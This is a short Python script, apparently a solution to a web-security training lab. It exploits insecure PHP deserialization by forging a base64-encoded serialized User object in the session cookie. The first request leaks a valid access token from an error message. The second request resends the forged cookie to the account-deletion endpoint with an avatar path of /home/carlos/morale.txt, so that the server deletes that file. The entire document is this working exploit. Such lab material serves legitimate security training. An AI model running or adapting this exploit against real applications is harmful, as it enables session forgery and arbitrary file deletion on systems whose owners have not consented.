import requests
import base64
import re
import sys
from urllib.parse import unquote

if len(sys.argv) != 2:
    print("Usage: python3 solution.py <url>")
    sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
delete_url = burp_url + '/my-account/delete'

session = requests.Session()
access_token = "1"*32

formatted_string = f'O:4:"User":3:{{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"{access_token}";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}}'
base64_encoded_string = base64.b64encode(formatted_string.encode('utf-8')).decode('utf-8')
burp_cookies = {"session": base64_encoded_string}
response = session.post(delete_url, cookies=burp_cookies)
token_match = re.search(r'username] = ([0-9a-zA-Z]{32})', response.text)
access_token = token_match.group(1)
formatted_string = f'O:4:"User":3:{{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"{access_token}";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}}'
base64_encoded_string = base64.b64encode(formatted_string.encode('utf-8')).decode('utf-8')
burp_cookies = {"session": base64_encoded_string}
response = session.post(delete_url, cookies=burp_cookies)
